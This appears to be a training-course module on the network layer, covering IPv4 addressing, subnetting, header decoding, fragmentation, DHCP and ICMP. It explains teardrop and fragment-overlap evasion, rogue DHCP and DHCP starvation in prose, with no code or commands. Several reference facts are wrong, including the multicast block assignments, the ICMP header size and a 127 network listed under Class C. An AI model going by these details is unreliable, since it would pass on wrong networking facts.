The moving of data across a series of interconnected networks is the job of devices and software that exist at this layer. The network layer must handle incoming packets from various sources, determine their final destination, and send them to the appropriate interface and forwarding devices to be processed and routed once again.
Encapsulation

Encapsulation of messages received from higher layers must be performed to be passed on to the data-link layer.
IP Fragmentation and Reassembly

Due to constraints on bandwidth and other limiting factors, the network layer must be able to fragment packets that are too large and re-assemble the data in order at the destination device.
Error Handling and Diagnostics

The network layer uses special helper protocols like ICMP and ARP that allow logically connected devices to exchange information about the status of the network or devices themselves.
Internet Protocol Versions

The network layer deals in two version of IP and ICMP, version 4 and version 6.

IPv4

Was the first working network layer protocol which has dominated the networking world since 1970s. At the time it was believed that 4.3 billion addresses would never be reached. In 1992 we started seeing the shortages take place and had to start developing methods of extending IPv4 until a permanent solution could be found. This is where and why subnetting, private ip addressing, and Network Address Translation protocol were developed and implemented.

The most significant issue with IPv4 is the exhaustion of available IPv4 addresses. The limited address space (32 bits) results in the depletion of available IPv4 addresses, making it challenging to assign unique addresses to new devices joining the network.

To assist in managing the eventual depletion of IPv4 address:

Subnetting and Address Allocation:

Efficiently allocate IPv4 address space through subnetting and address aggregation.
Use Variable Length Subnet Masking (VLSM) and Classless Inter-Domain Routing (CIDR) to allocate IP addresses based on the actual requirements of each subnet, avoiding wastage of address space.
RFC 1918 Private addresses:

RFC 1918 defines three blocks of IPv4 address space reserved for private use:
10.0.0.0/8 (10.0.0.0 - 10.255.255.255)
172.16.0.0/12 (172.16.0.0 - 172.31.255.255)
192.168.0.0/16 (192.168.0.0 - 192.168.255.255)
These address ranges are designated for use within private networks and are not globally routable on the public Internet.
Network Address Translation (NAT):

Implement NAT to conserve IPv4 addresses by allowing multiple devices within a private network to share a single public IP address.
NAT translates private IP addresses to a single public IP address when communicating with devices outside the private network, reducing the number of globally routable IPv4 addresses required.
IPv6

In 2011 IPv6 was released to use world wide. IPv6 was released to eventually replace IPv4 because of IPv4's lack of address space. Along with IPv6's release the packet design was simplified from the IPv4 15 sections header IPv6 holds only 8 section with less wasted fields.
Transitioning to IPv6 is the most effective long-term solution to address IPv4 exhaustion. IPv6 offers a significantly larger address space, allowing for an almost infinite number of unique IP addresses.
Organizations are encouraged to plan and implement IPv6 deployment strategies to gradually transition their networks and services to IPv6.


Resources


Instructor Note


2.1.1 Explain IPv4 Addressing¶
IPv4 (Internet Protocol version 4) is the fourth version of the Internet Protocol and is widely used to identify and locate devices on a network. IPv4 addresses are 32 bits in length and are typically represented in dotted-decimal notation, where each of the four octets is separated by a period.

32-Bit Address:

IPv4 addresses are 32 bits long, allowing for a total of 232 unique addresses. However, due to the rapid growth of the internet, the IPv4 address space became exhausted, leading to the development and adoption of IPv6.
Dotted-Decimal Notation:

IPv4 addresses are commonly represented in dotted-decimal notation, where each of the four octets is expressed as a decimal number. For example, the address 192.168.0.1 is divided into four octets: 192, 168, 0, and 1.
Address Classes:

IPv4 originally defined address classes A, B, C, D, and E, each with a different range of available addresses. However, classful addressing has largely been replaced by Classless Inter-Domain Routing (CIDR), which allows for more flexible allocation of address blocks.
IPv4 Address Types: There are several types of IPv4 addresses, including:

Unicast: Identifies a single network interface.
Broadcast: Sent to all devices on a network segment.
Multicast: Sent to a specific group of devices.
Anycast: Identifies the nearest of a group of devices.
Private and Public Addresses:

Private IPv4 addresses are reserved for use within private networks and are not routable on the public internet.
Common private address ranges include:
10.0.0.0 to 10.255.255.255
172.16.0.0 to 172.31.255.255
192.168.0.0 to 192.168.255.255
Public IPv4 addresses are globally unique and routable on the internet.
Public address are any IP address that is not already reserved.


Resources


Instructor Note


2.1.1.1 Describe Classful IPv4 addressing and subnetting¶
Classful IPv4 addressing and subnetting refer to the original addressing scheme defined in the early days of the Internet, where IP addresses were divided into predefined classes. Classful addressing has largely been replaced by Classless Inter-Domain Routing (CIDR), which offers more flexibility in address allocation. However, understanding classful addressing is fundamental to grasping the evolution of IP addressing.
Classful IPv4 Addressing



Classes of IPv4 can be derived from the first 4 binary bits of the first octet.

Class A - The first binary bit is off (00000000 to 01111111).

Range from 0 to 127.
Default mask is 255.0.0.0 or (CIDR) of /8.
Reserved:
Network 0 is not usable.
Network 127 is reserved for the local loopback.
10.0.0.0/8 is reserved for RFC 1918 private addressing.
100.64.0.0/10 is reserved for carrier-grade NAT.
Class B - The first binary bit is on and the second bit is off (binary 10000000 to 10111111).

Range from 128 to 191.
Default mask is 255.255.0.0 or (CIDR) of /16.
Reserved:
172.16.0.0/12 is reserved for RFC 1918 private addressing.
169.254.0.0/16 is reserved for the Microsoft APIPA range.
Class C - The first 2 binary bits are on and the third bit is off (binary 11000000 to 11011111).

Range from 192 to 223.
Default mask is 255.255.255.0 or (CIDR) of /24.
Reserved:
Network 127 is reserved for the local loopback.
192.168.0.0/16 is reserved for RFC 1918 private addressing.
Class D - The first 3 binary bits are on and the fourth bit is off (binary 11100000 to 11101111).

Range from 224 to 239.
Used for IPv4 Multicast. Multicast is considered one-to-many addressing. This is where 1 IP address can communicate with 1 or more different destinations.
Reserved:
224.0.0.0/24 range is used for link-local multicast.
Class E - The first 4 binary bits are on (binary 11110000 to 11111111).

Range from 240 to 255.
Reserved for "Future use". Discussions were made to start using it when IPv4 addresses were exhausted. It would require a lot of configuration and reprogramming of software and devices across the world. IPv6 was already developed at the time so it was recommended to just migrate to it.
Though "classful" networking is not in use today due to its wastefulness of IPs, it is important to understand how some routing protocols and other machines may read a network address different than what is intended. Classful subnetting meant that IPs were assigned in blocks of addresses based on the default mask for the address class (/8, /16, or /24). Subnetting was permitted as long as the subnets all used the same subnet mask. VLSM was not permitted to use classful addressing.

Subnetting

IPv4 Subnetting is the process to sub divide the larger network into smaller, less wasteful, subnets. For example if we have a given network of 192.168.10.128/25, which there are a total of 128 IPs (128-255), with the first IP assigned to the network address (128) and the last to the broadcast address (255). That leaves 126 IPs to be assigned to one network. If we needed to support two networks, we would need to subnet our original network into something smaller. We do this by borrowing a bit from the host side for the network side.

The CIDR, /25 in this case, identifies 25 network bits are cut "ON" (1) to produce a subnet mask of 255.255.255.128 leaving 7 host bits or "OFF" bits (0).

11111111.11111111.11111111.10000000

By borrowing from the host portion we can create 2 networks with a CIDR of /26.


Network reconnisaince we typically take the IP and CIDR and reverse it into the network (subnet) and ip range.
Using this chart you can identify the network, ip range, and broadcast of any IP with a CIDR of /24 and greater.
CIDR's of less than /24 follow a similar process except the increments can be in the 1st, 2nd, or 3rd octets.




Resources


Instructor Note


2.1.1.2 Analyze IPv4 packet header¶
Analyze IPv4 packet header





Byte 0:

Version (High 4 bits): Indicates the version of the Internet Protocol used. For IPv4, the value is set to 4 or 0x40.
Header Length (IHL) (Low 4 bits): Specifies the length of the IPv4 header in 32-bit words.
The standard IHL is 5 (0x05) to indiate 5 WORDS (20 bytes) in the IP header.
Since the IPv4 header length can vary due to optional fields, this field helps identify where the data payload begins.
IHL from 6 to F (15) will indicate the presence of IPv4 options in multiples of 4 bytes.
Byte 1:

Type of Service (TOS) (8 bits): From original [RFC 791], it was used for Quality of Service (QoS) prioritization. In [RFC 2474], this field was deprecated and replaced by Differentiated Services Code Point (DSCP) and Explicit Congestion Notification (ECN) fields in modern implementations.
DSCP (High 6 bits): Used to provide differentiated Quality of Service (QoS) treatment to packets as they traverse a network. It allows network administrators to prioritize certain types of traffic over others based on their requirements for latency, jitter, bandwidth, and reliability.
The DSCP field allows for 64 different values, ranging from 0 to 63 [RFC 4594]. Use the [DSCP chart] to determine values.
These values are organized into several predefined classes, each representing a different level of service or treatment for packets.
Values in this field do not equate to decimal or hex. In actuality the values in this field are bit-shifted 2 places to the left (<<2). This means that a DSCP of (1) would be a (4) in decimal. A DSCP of (32) would be a (128) in decimal.
ECN (Low 2 bits): An extension to the Internet Protocol (IP) that enables end-to-end notification of network congestion without dropping packets. It allows network devices, such as routers, to notify endpoints (senders and receivers) of impending congestion in the network, allowing them to respond appropriately.
00 – Not ECN-Capable - codepoint indicates that the packet's sender is not ECN-capable or does not wish to receive ECN notifications.
01 and 10 – ECN Capable - codepoint indicates that the packet's sender is ECN-capable and willing to receive congestion notifications.
11 – Congestion Experienced - codepoint is set by routers to indicate that congestion has been encountered along the packet's path.
DSCP	32	16	8	4	2	1	2	1
HEX	8	4	2	1	8	4	2	1
DEC	128	64	32	16	8	4	2	1
Bytes 2 and 3:

Total Length (16 bits): Indicates the total length of the IPv4 packet, including the header and the data payload. The maximum value is 65,535 bytes.
This field is largely controled by the Maximum Transmission Unit (MTU) for the connected network.
Bytes 4 and 5:

Identification (16 bits): Used for fragmentation and reassembly of IP packets. Each packet sent by the sender is assigned a unique identification value.
The IP ID field is used to assign a unique identification value to each IPv4 packet sent by a host.
This identification value is incremented for each subsequent packet sent by the host.
The combination of the IP ID value and the source IP address uniquely identifies each packet, which helps in identifying and processing packets at the receiving end.
This allows the receiving host to identify fragments belonging to the same original packet and reassemble them in the correct order.
Bytes 6 and 7:

Flags (High 3 bits): Contains control flags related to fragmentation:
Bit 0: Reserved, must be zero. This bit is sometimes referred to as the "Evil Bit" as defined in [RFC 3514].
Bit 1: Don't Fragment (DF) flag. If set, indicates that the packet should not be fragmented.
Packets requiring fragmentation will be dropped by the router and an ICMP type 3 code 4 "Fragmentation Needed and Don't Fragment was Set" will be sent back to the sender.
Bit 2: More Fragments (MF) flag. If set, indicates that this packet is a fragement and that more fragments will follow. This flag will be turned off for the very last fragment.
Fragment Offset (Low 13 bits): Indicates the position of the fragment within the original unfragmented packet, measured in units of 8 bytes. * The fragment offset is calculated by dividing the payload bytes by 8. This offset value is cumulative and is added to each fragment offset until the last fragment. * A payload of 1480 will have an offset of 1480/8 or 185. The offset values will be 0, 185, 370, 555, 740, etc.
Byte 8:

Time to Live (TTL) (8 bits): Represents the maximum number of hops (routers) the packet can traverse before being discarded. Decremented by one at each router hop.
Default TTLs:
Linux: 64
Windows: 128
Cisco: 255
Byte 9:

Protocol (8 bits): Specifies the protocol used in the data payload of the packet (e.g., TCP, UDP, ICMP).
ICMPv4: 1
TCP: 6
UDP: 17
EIGRP: 88
OSPF: 89
Bytes 10 and 11:

Header Checksum (16 bits): Provides error detection for the IPv4 header. Calculated based on the header contents and verified by the receiving host.
Bytes 12 to 15:

Source IP Address (32 bits): Specifies the IPv4 address of the sender of the packet.
Dotted decimal address are expresses as HEX.
10.0.0.1 would be 0x0a000001
Bytes 16 to 19:

Destination IP Address (32 bits): Specifies the IPv4 address of the intended recipient of the packet.
Dotted decimal address are expresses as HEX.
192.168.0.1 would be 0xc0a80001
Variable bytes from 20 to 59:

Options (variable length):
Always in multiples of 4 bytes (1 WORD).
Maximum options allowed is 40 bytes (10 WORDs).
Optional fields that may include various options such as Record Route, Timestamp, and Security.
Rarely used in practice due to limited support and potential security concerns.
Decoding an IPv4 Packet:

IPv4 packets will have the label of 0x0800 in the Ethertype field of the Ethernet Header.


00 1f 29 5e 4d 26 00 50　56 bb 3a a0 08 00 45 00
00 3c 83 1b 40 00 40 06　15 0a c0 a8 14 46 4a 7d
83 1b d5 1d 00 19 6b 7f　c7 2d 00 00 00 00 a0 02
72 10 a2 b5 00 00 02 04　05 b4 04 02 08 0a 0a 99
44 36 00 00 00 00 01 03　03 07 
00 1f 29 5e 4d 26 is the destination MAC

00 50 56 bb 3a a0 is the source MAC
08 00 is the ethertype for IPv4
45 to identify the Version is 4 and the IHL is 5 which means the IP header is 20 bytes in length. (IHL x 4)
00 is the DSCP. Used for Quality of Service (QoS).
00 3c is the Total length of 60 bytes. This includes the 20 byte header and 40 bytes of payload.
83 1b is the Identification field. Value is 33563.
40 00 is the Flags and fragmentation offset field. This value has the Dont Fragement (DF) turned on and no fragmentation offset.
80 00 is the value for the Reserved (Evil bit).
20 00 to 3F FF is the range for the More Fragements (MF) bit and fragmentation offset.
40 is the Time to Live field. Currently set to 64.
06 is the Protocol field. Currently set to identify TCP.
01 is for ICMPv4
11 is for UDP
15 0a is the Checksum field
c0 a8 14 46 is the source IP address. Currently set to 192.168.20.70.
4a 7d 83 1b is the destination IP address. Currently set to 74.125.131.27.
The remaining will be the payload.


DEMO of IPv4 header


Resources


Instructor Note


2.1.1.3 Identify IPv4 address types and scopes¶
IPv4 address types:

Unicast IPs are a "one to one" communication between two nodes.

A unicast address will fall within a Class A, B, or C address range. Any address not reserved can be used to assign to a host.
Unicast can be done using either ICMP at the network layer or using TCP/UDP at the transport layer.
Multicast IPs are used for a "one to many" communications concept throughout a network. Multicast addresses are used by routing protocols, video streaming, and other various systems that have need to communication in a group. These addresses fall within the Class D address range.

Range 224.0.0.0/4 - 224.0.0.0 thru 239.255.255.255
Multicast can only be done by using a network layer protocol or UDP at the transport layer.
Reserved Multicast addresses:
224.0.0.0 - 224.0.0.255 (224.0.0.0/24):
Reserved for local network control block. Used for protocols related to network configuration, maintenance, and management, such as OSPF (Open Shortest Path First) routing protocol.
224.0.1.0/24 (224.0.1.0 - 224.0.1.255): Internetwork Control Block. Reserved for network services discovery. Used by protocols such as Cisco's Hot Standby Router Protocol (HSRP) for discovering active routers.
224.0.2.0/24 (224.0.2.0 - 224.0.2.255): Network Time Protocol (NTP) multicast group. Used for time synchronization.
224.0.4.0/24 (224.0.4.0 - 224.0.4.255): Multicast DNS (mDNS). Used for local service discovery and resolution.
224.0.5.0/24 (224.0.5.0 - 224.0.5.255): Reserved for Internet Group Management Protocol (IGMP) version 3.
224.0.6.0/24 (224.0.6.0 - 224.0.6.255): Reserved for SDP (Session Description Protocol).
224.0.7.0/24 (224.0.7.0 - 224.0.7.255): Reserved for SAP (Session Announcement Protocol).
224.0.18.0/24 (224.0.18.0 - 224.0.18.255): Reserved for TRILL (Transparent Interconnection of Lots of Links) protocol.
224.0.22.0/24 (224.0.22.0 - 224.0.22.255): Reserved for Precision Time Protocol (PTP) version 2.
232.0.0.0/8 (excluding 232.0.0.0 - 232.255.255.255):
Reserved for source-specific multicast (SSM). SSM is a variant of multicast communication where receivers specify both the desired multicast group and the source from which they wish to receive the multicast traffic.
239.0.0.0 - 239.255.255.255 (239.0.0.0/8):
Reserved for administratively scoped multicast addresses. These addresses are used for local or private multicast communication within a specific administrative domain and are not intended to be forwarded beyond that domain.
Broadcast A broadcast address is the last IP in every network subnet range. It is used to communicate to all nodes on the same network.

These are identified when all the "host bits" are turned on (all one's).
For example: 192.168.0.255/24 is a directed broadcast address for the 192.168.0.0/24 network.
Directed broadcasts can be used for various purposes, such as:
Network management: Sending management or configuration commands to all devices within a specific subnet.
Wake-on-LAN (WoL): Waking up or powering on devices remotely by sending a directed broadcast packet containing a Wake-on-LAN magic packet.
Service discovery: Discovering services or devices within a local network segment.
Limited Broadcast using the 255.255.255.255 address.
Unlike directed broadcasts, which are targeted to a specific subnet, the limited broadcast address is used to send packets to all hosts on the local network, regardless of their subnet.
Here are some key points about the 255.255.255.255 broadcast address:
Local network scope: Packets sent to 255.255.255.255 are not forwarded by routers. They are only delivered to hosts within the same local network segment or subnet as the sender.
One-to-all communication: When a host sends a packet to this address, it is effectively sending it to all hosts on the local network. This makes it useful for scenarios where a host needs to communicate with all other hosts on the same network segment.
Broadcast domain: The limited broadcast address operates within the broadcast domain of a network. Devices within the same broadcast domain receive broadcasts sent to 255.255.255.255.
Broadcast storm risk: Since the limited broadcast address sends packets to all hosts on the local network, it can potentially cause a broadcast storm if not used judiciously. A broadcast storm occurs when there is a high volume of broadcast traffic on the network, which can degrade network performance or even cause network outages.
Use cases: Limited broadcast is often used for tasks like DHCP (Dynamic Host Configuration Protocol) address assignment, network discovery, or service advertisement within a local network.
Broadcast can only be done by using certain network layer protocols or UDP at the transport layer.
IPv4 address scopes:

Public IP ranges are assigned by IANA throughout the world. These addresses are typically any Class A, B, or C address that is not otherwised reserved. For more information on public addressing visit [IANA]. These address spaces are identified in [RFC 1366].

Private These IPs are not globally routable across the Internet and are available for use by all for internal LANs. These addresses must be translated to a public address for traversal across the internet. This IP addresses are identified by IETF in [RFC 1918].

Class A scope 10.0.0.0/8 - 10.0.0.0 thru 10.255.255.255
Class B scope 172.16.0.0/12 - 172.16.0.0 thru 172.31.255.255
Class C scope 192.168.0.0/16 - 192.168.0.0 thru 192.168.255.255
Loopback address also called localhost. This is an internal address (127.0.0.1) linked back to the host machine. Can not be assigned to a device NIC. Can only be used to allow the system to address itself.

127.0.0.0/8 - 127.0.0.0 thru 127.255.255.255
Link-Local is used for direct node to node communications on the same physical or logical link, not a routable range. This range is used for Microsoft's Automatic Private IP Addressing (APIPA). This is used to allow DHCP configured clients to resolve an IP address even if no DHCP servers are available. Systems will auto generate an address in this range if it fails to get an IP address from the DHCP server. These addresses allow devices to communicate with each other on the same network but not across any routed boundries. This is addressed in [RFC 3927].

169.254.0.0/16
Multicast

224.0.0.0/24 - Link-Local - multicast for host on the same network segment. Cannot traverse routed bounderies.
224.0.1.0-238.255.255.255 - Global - able to be routed across the internet.
239.255.0.0/16 - Local - scope is able to be controlled by an organization.
239.192.0.0/14 - Organizational-local - routable within an organizations network.
Special Use Addresses are reserved for special uses and are defined in various RFCs:

0.0.0.0 - Used to denote an unknown or unspecified target address.
255.255.255.255 - Used for broadcast messages to all hosts on the local network.
Reserved Addresses for Documentation addresses are used in documentation and examples, ensuring that examples do not clash with actual IP addresses in use. They are defined in [RFC 5737] and [RFC 5735].

192.0.2.0/24 - This block is assigned as "TEST-NET-1" for use in documentation and example code.
198.18.0.0/15 - This block has been allocated for use in benchmark tests of network interconnect devices.
198.51.100.0/24 - This block is assigned as "TEST-NET-2" for use in documentation and example code.
203.0.113.0/24 - This block is assigned as "TEST-NET-3" for use in documentation and example code.
Experimental Addresses are reserved for experimental use and are not intended for general use. They are defined in [RFC 3330].

240.0.0.0/4 - 240.0.0.0 to 255.255.255.255 - Reserved for future use and experimental purposes.


Resources


Instructor Note


2.1.1.4 Explain Fragmentation with it's vulnerability¶
IPv4 Fragmentation

IP fragmentation breaks up a single IPv4 packet into multiple smaller packets. Every link in a network has a defined maximum transmission unit (MTU). Ethernet’s default MTU is 1500 bytes. An IP header is included in the 1500 byte MTU.

The 14-22 byte Ethernet header is not counted within the 1500 byte MTU. Other Layer 2 framing protocols (Ethernet, Token Ring, FDDI, PPoE, etc) can have different MTUs.

Routers are often the devices performing fragmentation in IPv4. Other devices can perform this action if they also perform in the routing capacity.

In IPv4, routing devices perform fragmentation if the total size of the packet (header and data) coming from one network interface is greater than the MTU of the network out the exiting interface.

IPv4 Flags: [IPv4 header byte offset 6], A 3 bit field that declares if the packet is a part of a fragmented data frame or not. Reading the field from left to right.

Bit 0 (128): reserved
should always be 0
See RFC 3514 for a description of the “evil bit.”
Bit 1 (64):
0 = May Fragment
1 = Don’t Fragment this packet
Packets requiring fragmentation with this bit set will be dropped by routers resulting an ICMP Type 3 Code 4 "Fragmentation Needed and Don't Fragment was Set" message to be sent back to the source.
Bit 2 (32):
0 = Not fragemented or Last Fragment
Last fragment will have an offset value set.
1 = More Fragments follow (first fragement until 2nd to last fragement).
First fragment will not have an offset value set.
Fragment Offset field is a 13-bit field found in the IPv4 header.

It indicates the position of the data payload of the current fragment relative to the beginning of the original unfragmented packet.
With only 13 bits assigned, the values can only be 0-8191.
The values in this field is determined by dividing the fragmented bytes per packet by 8.
It is determined by using the following formula:
Offset = (MTU - (IHL x 4)) ÷ 8.
Value must divide evenly.
If the division does not result in an integer, the MTU is reduced to ensure the payload size aligns with 8-byte boundaries.
The fragment offset is calculated by dividing the payload bytes by 8. This offset value is cumulative and is added to each fragment offset until the last fragement.
A payload of 1480 will have an offset of 1480 / 8 or 185.
The offset values will be 0, 185, 370, 555, 740, etc until all bytes are sent or until the max of 8191 (213).


More Fragmentation Examples




How IP Fragmentation Works
Packet Fragmentation:
When a packet is too large to fit into the MTU of a network segment, it is broken into smaller pieces called fragments.
Each fragment is a separate IP packet with its own header and part of the original packet's data.
Fragment Header Fields:
Identification: All fragments of a single packet have the same identification number.
Flags: The "More Fragments" (MF) flag indicates if more fragments follow. The last fragment has this flag set to 0.
Fragment Offset: Indicates the position of the fragment's data within the original packet.
Total Length: Length of the fragment, including the header and data.
Reassembly:
At the destination, fragments are reassembled into the original packet based on the identification number and fragment offset.
If a fragment is missing or corrupted, the entire packet cannot be reassembled.
IPv6 Fragmentation

IPv6 inherently does not support fragmentation within it headers. It lacks the fields required. It can however include follow-on IPv6 Fragmentation headers should it be needed. IPv6 fragmentation must be done on the sending host using the fragmentation extension headers.

Routers in the traffic path will not fragment any IPv6 packets. Any packets larger than the supported MTU are dropped and an ICMPv6 Type 2 "packet too big" message is sent to the source. This is essentially like having the DF bit set to ON for all packets. Any needed fragmentation must be done by the source node.

The source node conducts a Path MTU Discovery (PMTU) by sending MTU discovery packets to the destination. If the source node receives a Type 2 "packet too big" message it will decrease the packet size. The smallest (generally) safe IPv6 MTU size is 1280 bytes. This guarantees delivery based on packet size but increases the number of packets needing to be sent. Even more if VPN or tunneling is used.

Fragmentation was removed in IPv6 for several reasons. Some thought fragmentation was inefficient. Any lost fragment makes the entire original packet unusable as there is no way to identify the missing fragment to be resent. Additionally security concerns of fragmentation overlapping attacks and the lack of a TCP/UDP header on fragment except the initial fragment were other reasons to remove fragmentation altogether.



DEMO IPv4 Fragmentation


IP Fragment Overlapping

IP fragment overlapping exploit happens when two or more packet fragments have fragment offsets that indicate that they overlap each other.

Fragment Overlapping Attacks

Description: Attackers can craft overlapping fragments where data in one fragment overlaps with data in another. This can confuse the reassembly process and potentially allow malicious payloads to bypass security mechanisms.
Impact: Can be used to evade detection by firewalls or intrusion detection systems (IDS) that might not properly handle overlapping fragments.
Evasion Attacks

Description: Malicious payloads can be split across multiple fragments, with each fragment containing a portion of the payload. Security devices that inspect packets might only see parts of the payload and fail to detect malicious content.
Impact: Allows attackers to bypass security measures like firewalls and IDS, which may not reassemble fragments before inspection.
Example: a MTU of 1500 will have a offset of 185. 1500 MTU - 20 Bytes of IP header = 1480 Bytes. Each IP packet will include up to 1480 bytes of fragment information. To determine the offset value, this will be divided by 8 and will equal 185. So the first fragment will have the MF=1 and offset =185. The second fragment will increment the offset by 185 each time. So the second fragment offset will be 185, the third will be 370, the fourth 555, the fifth is 740 and so fourth. Each packet will have 1480 bytes of data.

In an overlap attack such as the teardrop attack, the offsets will not be sequential in chunks of 185 as it should. The offset could be changed to something like 175. This would mean that 80 bytes of the first fragment will be overwritten by the second fragment and so fourth. The resulting information will be much different than if each packet was examined individually.

This form of attack is successful if the attacker is aware of the host computers and networking equipment on the victim's network. This is because different equipment types perform different process in order to reconstruct the fragmented packets. Armed with this knowledge, the attacker can craft his attack to reconstruct the fragmented packets in a more proprietary way to avoid detection. Using this process fragments can avoid detection by firewalls and IDS/IPS devices. This is because when they reconstruct the message using their reconstruction processes it will not see the intended information.

Teardrop Attack

In a Teardrop attack, the attacker will use overlapping packets as well as additional random data. When constructed properly, the random data portions will be overwritten and result in the malicious payload. Although firewalls and IDS/IPS devices may not detect this payload.

This is a form of denial-of-service (DoS) attack that uses fragmented packets to bypass firewalls to a target a victim's machine. The victim's computer receiving the packets won't be able reconstruct the packet properly due to a bug in TCP/IP fragmentation reassembly process, the packets will overlap each another, thus crashing the victim's network device. Typically only older operating systems such as Windows 3.1x, Windows 95, Windows NT and versions of the Linux kernel prior to 2.1.63 are vulnerable to this attack.

[Teardrop pcap from wiki.wireshark.org]



Resources


Instructor Note


2.1.1.5 Explain OS Fingerprinting with TTL¶
OS fingerprinting is the process of analyzing the TTL fields on a header packet to make an educated guess at which operating system sent the packet by your TTL maximum hops. Different systems can have varing TTLs that can help to identify them on the network, some of the systems are listed in the chart.

This will be covered more indepth in Lesson 6 Network Analysis.



Unless you capture the packet immediately from the source host, the TTL will not likely be set to these values.
In general, it should not take more than about 30 hops to reach any destination on the internet.
With this in mind we can make the following determination:
Linux: TTL from 34-64
Windows: TTL from 98-128
Cisco: TTL from 225-255


Resources


Instructor Note


2.1.1.6 Explain IPv4 Auto Configuration with vulnerability¶
IPv4 auto-configuration refers to the process by which IPv4 addresses are automatically assigned to devices without manual intervention.

APIPA

Automatic Private IP Addressing (APIPA) is the automatic configuration of an ip address to a host machine and selects an address using a pseudo-random number generator with a uniform distribution in the range from 169.254.1.0 to 169.254.254.255.
The first 256 and last 256 addresses in the 169.254/16 prefix are reserved for future use and MUST NOT be selected by a host using this dynamic configuration mechanism.
When a host machine is set for Dynamic Host Configuration Protocol (DHCP) and is unable to locate a DHCP server, an APIPA address is given to the machine to allow it to communicate via Link-Local to other machines on the same physical or logical link.
DHCP

Dynamic Host Control Protocol (DHCP) when configured on a host machine will send a broadcast DHCPDISCOVER message to and available DHCP servers.
DHCP D.O.R.A process

DHCP D iscover:

When a device (client) connects to a network and needs to obtain an IP address, it sends out a DHCP Discover message to discover DHCP servers on the network.
The DHCP Discover message is broadcasted as a DHCP broadcast packet, typically using the destination IP address 255.255.255.255 and the destination MAC address ff:ff:ff:ff:ff:ff.
DHCP O ffer:

DHCP servers on the network that receive the DHCP Discover message respond with a DHCP Offer message.
The DHCP Offer message contains an available IP address and other network configuration parameters (such as subnet mask, default gateway, DNS server addresses) that the DHCP server is offering to the client.
The DHCP Offer message is typically sent as a unicast packet to the client's MAC address.
DHCP R equest:

Upon receiving one or more DHCP Offer messages, the client selects one DHCP server and sends a DHCP Request message to that server.
The DHCP Request message includes the IP address offered by the selected DHCP server.
If the client receives multiple DHCP Offer messages, it may send DHCP Request messages to multiple servers, but it will ultimately accept only one offer.
DHCP A cknowledge (ACK):

The DHCP server that receives the DHCP Request message verifies the requested IP address's availability and reserves it for the client.
The DHCP server sends a DHCP Acknowledge (ACK) message to the client, confirming the IP address assignment and providing additional configuration parameters.
The DHCP Acknowledge message is sent as a unicast packet to the client's MAC address.


DEMO of DHCP


Vulnerability

These processes do work as long as there are IPs available to be assigned, a legitimate DHCP server available, or trust of others hosts on the Link-Local. The vulnerability in that there is no verification or authorization being performed by default. These default auto configurations could allow an attacker to gain access into your network, assign out false IPs, and/or perform a denial/starvation attack.

Rogue DHCP servers are very common and easy to setup. A malicious person can setup a Rogue DHCP server to assign addresses for a particular network. In these configurations the attacker can assign whatever they want for the Gateway, DNS suffix and DNS server addresses. A malicious DNS server can result in legitimate Domain names being resolved to IP addresses of fake websites used to steal credentials or deploy malware.

DHCP Starvation attack. When a malicious user has to compete with the legitimate DHCP server for address assignments, the attacker can flood the DHCP server with several bogus DHCP requests in order to exaust its pool of addresses. Once this is done the rougue DHCP server is the only DHCP server with addresses to assign.

DHCP Security Considerations [RFC 2131 Section 7]

Link-Local Security Considerations [RFC 3927 Section 5]



Resources


Instructor Note


2.1.1.7 Analyze ICMPv4 protocol and header structure¶




ICMPv4

ICMP is used to provide feedback about network problems that may or do prevent packet delivery. This protocol was designed to provide error reporting, flow control and first-hop gateway redirection. While IP and UDP are unreliable, it is still important to have a way to notify the sender if something goes wrong in a transmission. TCP is able to realize and react when packets aren't being delivered, but ICMP provides a method for discovering more serious problems like "TTL exceeded" or "need more fragments."

Echo Request (Type 8):

Sent by a device to request an Echo Reply from another device.
Often used by the "ping" utility to test network connectivity and measure round-trip time.
Depending on the operating system Echo Requests (PING) can have different packet sizes and default payloads.
Linux:
Default size: 64 bytes (16 byte ICMP header + 48 byte payload)
Payload message: !\”#\$%&\‘()*+,-./01234567
Windows:
Default size: 48 bytes (16 byte ICMP header + 32 byte payload)
Payload message: abcdefghijklmnopqrstuvwabcdefghi
Echo Reply (Type 0):

Sent by a device in response to an Echo Request.
Contains the same payload as the original Echo Request and is used to confirm network connectivity.
Destination Unreachable (Type 3):

Destination Network Unreachable (Code 0):

Indicates that the network hosting the destination address is unreachable.
This can occur if there is no route to the destination network in the routing table.
Destination Host Unreachable (Code 1):

Indicates that the specific destination host is unreachable.
This can occur if there is no route to the destination host in the routing table or if the destination host is down.
Destination Protocol Unreachable (Code 2):

Indicates that the transport protocol specified in the packet's header is not supported by the destination.
For example, if a UDP packet is sent to a destination that does not have a process listening on the specified UDP port, this error may be generated.
Destination Port Unreachable (Code 3):

Indicates that the specified port on the destination host is unreachable.
This typically occurs when there is no process listening on the specified port or if a firewall is blocking access to the port.

Fragmentation Needed and Don't Fragment was Set (Code 4):

Indicates that the packet is too large to be transmitted without fragmentation, but the Don't Fragment (DF) flag is set in the packet's header.
This error is generated to inform the sender that the packet needs to be fragmented to be transmitted successfully.
Source Route Failed (Code 5):

Indicates that the source route specified in the packet's header is invalid.
Source routing allows the sender to specify the route that the packet should take through the network, but if the specified route is invalid, this error may be generated.
Destination Network Unknown (Code 6):

Indicates that the destination network is unknown.
This error typically occurs when the destination network is not listed in the routing table.
Destination Host Unknown (Code 7):

Indicates that the destination host is unknown.
This error typically occurs when the destination IP address is not reachable or is not assigned to any host.
Source Host Isolated (Code 8):

Indicates that communication with the source host is administratively prohibited.
This error is generated by a router or firewall to indicate that the source host is isolated or not allowed to communicate with the destination.
Communication with Destination Network Administratively Prohibited (Code 9):

Indicates that communication with the destination network is administratively prohibited.
This error typically occurs when access to the destination network is restricted by network policies or firewall rules.
Communication with Destination Host Administratively Prohibited (Code 10):

Indicates that communication with the destination host is administratively prohibited.
This error typically occurs when access to the destination host is restricted by network policies or firewall rules.
Network Unreachable for Type of Service (Code 11):

Indicates that the network is unreachable for the specified type of service.
This typically occurs when the network does not support the requested type of service or quality of service.
Host Unreachable for Type of Service (Code 12):

Indicates that the destination host is unreachable for the specified type of service.
This typically occurs when the destination host does not support the requested type of service or quality of service.
Communication Administratively Prohibited (Code 13):

Indicates that communication with the destination is administratively prohibited.
This can occur due to network policies or firewall rules that explicitly block communication with the destination.
Redirect (Type 5):

Used by routers to inform hosts of a better route to a particular destination.
Informs the host to update its routing table with the new route information.
